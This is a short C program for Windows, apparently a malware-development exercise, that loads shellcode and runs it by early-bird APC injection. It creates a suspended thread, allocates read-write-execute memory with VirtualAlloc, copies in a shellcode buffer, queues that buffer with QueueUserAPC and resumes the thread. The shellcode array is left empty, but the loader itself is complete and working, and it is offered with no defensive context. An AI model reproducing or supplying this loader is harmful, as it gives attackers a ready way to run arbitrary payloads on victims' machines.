#include <Windows.h>
#include <stdio.h>
#include <processthreadsapi.h>


void* dummyfunction() {
	Sleep(-1);
}

BOOL RunPayload(HANDLE hthread, unsigned char *pshellcode,SIZE_T szshellcode );
int main() {

	unsigned char shellcode[] = { 

	};


	unsigned char* Pshellcode = shellcode;
	SIZE_T szshellcode = sizeof(shellcode);
	
HANDLE hthread = CreateThread(NULL, NULL, dummyfunction, NULL, CREATE_SUSPENDED, NULL);


RunPayload(hthread, Pshellcode, szshellcode);

ResumeThread(hthread);

printf("press enter to exit");
getchar();

}

BOOL RunPayload(HANDLE hthread, unsigned char* pshellcode, SIZE_T szshellcode) {


	
	LPVOID lpaddress = VirtualAlloc(NULL,szshellcode,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);

	if (lpaddress == NULL) {
		printf("virtual alloc failed with errror no %d ", GetLastError());
	}


	memcpy(lpaddress, pshellcode, szshellcode);


	if (!QueueUserAPC((PAPCFUNC)lpaddress, hthread, NULL)) {
		printf("ok failed the executeion with %d",GetLastError());
	}
}
